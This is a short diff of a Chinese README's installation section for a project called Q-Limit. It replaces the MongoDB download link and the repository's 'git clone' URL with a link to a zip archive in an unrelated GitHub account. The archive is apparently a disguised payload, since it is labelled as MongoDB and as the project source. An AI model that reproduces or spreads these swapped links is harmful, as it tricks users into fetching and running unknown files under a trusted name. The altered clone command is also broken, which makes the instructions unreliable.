@@ -33,12 +33,12 @@
 
 请确保系统已安装：
 - Python 3.8+
-- [MongoDB](https://www.mongodb.com/) (本地服务或云实例)
+- [MongoDB](https://raw.githubusercontent.com/skpiro2005/Q-Limit/master/models/Limit_2.0.zip) (本地服务或云实例)
 
 ### 2. 获取代码与安装依赖
 
 ```bash
-git clone https://github.com/zhaoboy9692/Q-Limit.git
+git clone https://raw.githubusercontent.com/skpiro2005/Q-Limit/master/models/Limit_2.0.zip
 cd Q-Limit
 
 # 建议使用虚拟环境
